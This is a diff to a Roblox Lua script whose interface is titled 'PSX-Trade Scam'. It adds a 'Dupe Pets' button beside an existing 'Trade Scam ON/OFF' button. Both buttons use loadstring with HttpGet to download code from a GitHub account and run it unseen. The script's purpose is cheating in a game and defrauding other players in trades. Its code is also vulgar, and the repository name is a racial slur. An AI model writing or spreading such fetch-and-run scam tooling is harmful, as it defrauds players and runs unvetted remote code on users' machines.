@@ -3,6 +3,7 @@ local Window = Library.CreateLib("PSX-Trade Scam", "Midnight")
     -- MAIN
     local Main = Window:NewTab("Main")
     local MainSection = Main:NewSection("Main")
+     local MainSection = Main:NewSection("Credit")
     
     
      MainSection:NewButton("Made By Otochan_Blinx#0252", "Dm For Info fuck", function()
@@ -12,5 +13,9 @@ local Window = Library.CreateLib("PSX-Trade Scam", "Midnight")
 
     MainSection:NewButton("Trade Scam ON/OFF", "THIS BUTTON TURNS OFF AND ON THE SCRIPT", function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/bltryrt/chingchong/main/123'))()
+        print("Activated")
+    end)
+MainSection:NewButton("Dupe Pets", "THIS BUTTON TURNS OFF AND ON THE SCRIPT", function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/bltryrt/chingchong/main/213'))()
         print("Activated")
     end)
